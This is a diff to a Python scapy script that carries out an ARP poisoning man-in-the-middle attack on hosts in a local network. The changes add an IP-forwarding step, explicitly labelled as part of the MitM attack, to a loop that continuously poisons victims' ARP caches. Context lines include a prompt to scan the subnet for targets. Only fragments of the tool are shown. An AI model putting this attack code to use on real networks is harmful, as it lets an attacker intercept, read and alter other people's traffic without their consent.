@@ -1,5 +1,6 @@
 from scapy.all import *
 from scapy.layers import *
+from scapy.layers.inet import IP
 import threading
 import time
 import socket
@@ -23,6 +24,8 @@ settings["duckforce"] = False # Continously ARP poison the victims in order to n
 def start():
 
 	def arp(VICTIM_MAC, VICTIM_IP, duckforce):
+		print("\n Enabling IP Forwarding (MitM attack)...")
+		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 		while True:
 			#Poisoning the Victim
 			arp= Ether() / ARP()
@@ -54,7 +57,7 @@ def start():
 
 	print("Want to scan for all connected devices in the network? (Y/N)")
 	choice = input()
-	addresses=[]
+	hosts=[]
 	if choice == "y" or choice == "Y" or choice == "yes" or choice =="YES":
 		target = '192.168.56.0/24'
  
